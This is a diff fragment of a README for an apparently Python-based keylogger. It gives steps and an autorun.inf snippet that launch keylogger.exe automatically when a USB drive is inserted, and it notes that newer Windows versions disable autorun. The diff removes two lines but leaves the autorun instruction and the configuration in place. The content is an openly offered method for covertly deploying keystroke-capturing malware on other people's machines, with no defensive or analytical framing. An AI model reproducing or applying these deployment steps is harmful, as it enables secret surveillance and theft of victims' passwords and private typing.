@@ -14,11 +14,9 @@ pip install pynput
 &nbsp;
 ## To make the program run automatically when the USB is inserted
 
-- Copy the executable (`keylogger.exe`) to the USB drive.
 - Create an `autorun.inf` file to make the program run automatically when the USB is inserted (on older versions of Windows).  
   **Note:** Newer systems often disable autorun for security reasons.
 
-### Example `autorun.inf`:
 ```
 [autorun]
 open=keylogger.exe
